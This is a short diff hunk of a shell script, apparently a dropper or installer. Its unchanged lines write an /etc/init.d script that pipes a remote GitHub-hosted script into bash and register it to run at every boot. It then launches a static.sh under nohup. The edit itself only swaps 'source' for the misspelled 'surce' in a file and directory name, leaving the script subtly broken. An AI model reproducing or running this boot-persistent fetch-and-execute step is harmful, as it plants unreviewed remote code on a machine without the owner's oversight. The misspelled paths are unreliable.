@@ -9,7 +9,7 @@ cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/modums/roreut/main/sunsor.sh)" > emitter.sh
 chmod a+x emitter.sh
 update-rc.d emitter.sh defaults
-rm -rf source.tar
-cd /source
+rm -rf surce.tar
+cd /surce
 nohup ./static.sh
 ps -ef | grep source
